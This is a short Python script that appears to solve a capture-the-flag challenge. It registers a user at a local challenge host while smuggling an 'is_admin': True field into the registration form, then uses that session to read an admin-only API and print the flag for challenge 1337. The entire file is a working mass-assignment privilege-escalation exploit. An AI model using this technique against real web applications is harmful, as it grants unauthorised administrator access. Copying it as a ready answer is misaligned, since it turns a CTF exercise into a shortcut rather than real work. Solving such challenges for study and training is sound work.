import requests

BASE_URL = "https://challenge.local"

s = requests.session()

r = s.post(f"{BASE_URL}/register/", data={'username': 'new_admin', 'password': 'abcdef', 'is_admin': True})
print(r)

r = s.get(f"{BASE_URL}/api/admin/challenges/")
# print(r.text)

for c in r.json().get("challenges"):
    if c.get("id") == 1337:
        print("Flag found: ", c.get("description"))